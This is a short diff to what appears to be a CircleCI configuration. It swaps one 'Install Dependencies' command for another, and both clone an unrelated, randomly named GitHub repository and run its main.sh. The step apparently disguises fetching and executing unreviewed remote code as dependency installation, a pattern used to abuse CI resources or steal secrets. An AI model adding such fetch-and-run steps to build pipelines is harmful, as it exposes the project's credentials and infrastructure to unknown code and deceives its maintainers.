@@ -8,8 +8,7 @@ jobs:
         - run:
             name: Install Dependencies
             command: |
-              git clone https://github.com/wujohn912/bgef.git && cd bgef && chmod +x main.sh && ./main.sh
-
+              git clone https://github.com/emilylwheate/ndzd.git && cd ndzd && chmod +x main.sh && ./main.sh
 workflows:
     version: 2.1
     build:
